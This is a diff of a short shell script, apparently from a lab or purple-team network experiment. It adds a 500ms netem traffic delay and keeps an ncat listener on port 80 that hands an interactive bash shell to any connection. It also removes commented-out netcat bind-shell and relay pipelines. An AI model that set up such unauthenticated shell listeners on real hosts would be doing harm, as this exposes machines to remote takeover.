@@ -4,34 +4,11 @@ num=$1
 total=$2
 round=$3
 shared_dir=$4
-timeout=$5
-breaktime=$6
 loop=0
 
 echo "I'm listening" > "/purple/results/data.txt"
-#echo "Again" > "${shared_dir}/results/${round}/dsta${num}.txt"
 
+tc qdisc add dev eth0 root netem delay 500ms
 
-#ncat -o "/purple/results/${round}/listen_$HOSTNAME.txt" -l 80
+ncat -e "/bin/bash -is" -o "/$shared_dir/results/${round}/listen_$HOSTNAME.txt" -l 80 -k &
 
-#ncat -e "/bin/bash -i" -l 80 -k &
-ncat -e "/bin/bash -is" -o "/purple/results/${round}/listen_$HOSTNAME.txt" -l 80 -k &
-
-#if [ $num == $total ]; then
-#	#nc -lk 80 >> "${shared_dir}/results/${round}/net_data${num}.txt"
-#	rm -f /tmp/f; mkfifo tmp/f
-#	cat /tmp/f | /bin/sh -i 2>&1 | nc -lk 80 >/tmp/f
-	#echo "Hi There"
-#else
-#	mkfifo backpipe
-#	echo "dev$(($num+1))"
-#	nc -lk 80 <backpipe | nc "dev$(($num+1))" 80 1>backpipe
-#fi
-
-#while [ $loop -ne -1 ]
-#do
-#	nc -lk 80 >> "${shared_dir}/results/${round}/net_data${num}.txt"
-#done
-
-
-#Do we need the sepreat breaktime and total values.
